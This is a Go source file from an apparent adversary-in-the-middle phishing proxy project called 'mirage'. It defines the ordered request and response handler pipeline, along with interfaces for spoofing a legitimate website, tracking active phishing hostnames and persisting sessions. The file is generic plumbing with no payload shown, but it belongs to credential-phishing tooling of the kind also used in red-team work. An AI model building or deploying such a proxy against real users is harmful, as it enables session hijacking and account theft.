// Package proxy implements the HTTPS AiTM proxy pipeline.
package proxy

import (
	"errors"
	"log/slog"
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
)

// RequestHandler is one step in the request pipeline.
// Handle is called with the mutated http.Request that will be forwarded upstream.
// Returning ErrShortCircuit stops the pipeline; the handler must write a complete
// response to ctx.ResponseWriter before returning.
type RequestHandler interface {
	Name() string
	Handle(ctx *aitm.ProxyContext, req *http.Request) error
}

// ResponseHandler is one step in the response pipeline.
// Handle is called with the upstream response before it is sent to the client.
// Returning ErrShortCircuit stops the pipeline and sends the response as-is.
type ResponseHandler interface {
	Name() string
	Handle(ctx *aitm.ProxyContext, resp *http.Response) error
}

// ErrShortCircuit is returned by a handler to halt pipeline execution.
// It is a normal flow-control signal and is never logged as an error.
var ErrShortCircuit = errors.New("pipeline: short circuit")

// Spoofer transparently reverse-proxies a configured legitimate website.
// Implemented by the proxy-level SpoofProxy.
type Spoofer interface {
	ServeHTTP(w http.ResponseWriter, r *http.Request)
}

// HostnameSet is a concurrency-safe set of active phishing hostnames.
type HostnameSet interface {
	Contains(hostname string) bool
}

// SessionUpdater persists session changes.
type SessionUpdater interface {
	UpdateSession(session *aitm.Session) error
}

// Pipeline holds ordered slices of request and response handlers.
type Pipeline struct {
	requestHandlers  []RequestHandler
	responseHandlers []ResponseHandler
	logger           *slog.Logger
}

// NewPipeline constructs a Pipeline with the given ordered handler slices.
func NewPipeline(requestHandlers []RequestHandler, responseHandlers []ResponseHandler, logger *slog.Logger) *Pipeline {
	return &Pipeline{
		requestHandlers:  requestHandlers,
		responseHandlers: responseHandlers,
		logger:           logger,
	}
}

// RunRequest executes all request handlers in order.
// Returns ErrShortCircuit if any handler short-circuits.
func (p *Pipeline) RunRequest(ctx *aitm.ProxyContext, req *http.Request) error {
	for _, handler := range p.requestHandlers {
		if err := handler.Handle(ctx, req); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				p.logger.Debug("request pipeline short-circuited", "handler", handler.Name())
				return ErrShortCircuit
			}
			p.logger.Error("request handler error", "handler", handler.Name(), "error", err)
			return err
		}
	}
	return nil
}

// RunResponse executes all response handlers in order.
func (p *Pipeline) RunResponse(ctx *aitm.ProxyContext, resp *http.Response) error {
	for _, handler := range p.responseHandlers {
		if err := handler.Handle(ctx, resp); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				p.logger.Debug("response pipeline short-circuited", "handler", handler.Name())
				return ErrShortCircuit
			}
			p.logger.Error("response handler error", "handler", handler.Name(), "error", err)
			return err
		}
	}
	return nil
}
